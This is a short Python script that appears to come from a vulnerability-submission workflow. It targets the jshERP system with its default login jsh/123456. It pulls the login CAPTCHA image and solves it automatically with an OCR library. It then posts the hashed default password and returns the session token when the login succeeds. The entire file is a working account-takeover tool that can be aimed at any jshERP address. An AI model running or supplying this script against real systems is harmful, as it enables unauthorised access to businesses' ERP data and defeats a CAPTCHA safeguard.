#!/usr/bin/env python3
#author: xazlsec
# jshErp 弱口令检测：jsh/123456

import sys
import base64
import ddddocr
import requests

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
}

ocr = ddddocr.DdddOcr(show_ad=False)

#获取验证码
def get_code(site):
    url = site + "/jshERP-boot/user/randomImage"
    datainfo = requests.get(url, headers=headers, verify=False, timeout=5).json()
    imgb64data = datainfo["data"]["base64"].replace('data:image/jpg;base64,','')
    uuid = datainfo["data"]["uuid"]
    imgdata = base64.b64decode(imgb64data)
    code = ocr.classification(imgdata)
    print(site, code, uuid)
    return code, uuid

#尝试登录，获取 token
def check_login(site):
    code = "7cqb" 
    uuid = "c940d57997c240ef9fc3f759017ba3a3"
    try:
        code, uuid = get_code(site)
    except:
        print(site, sys.exc_info())
        pass
    
    url = site + "/jshERP-boot/user/login"
    postdata={"code": code, "loginName": "jsh", "password": "e10adc3949ba59abbe56e057f20f883e", "uuid": uuid}
    try:
        datainfo = requests.post(url, headers=headers, json=postdata, verify=False, timeout=5).json()
        print(datainfo)
        if datainfo["code"] == 200:
            return datainfo["data"]["token"]
    except:
        print(site, sys.exc_info())
        pass
    return  ""

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 jsherp-default-jsh-123456.py ",target)
    check_login(target)
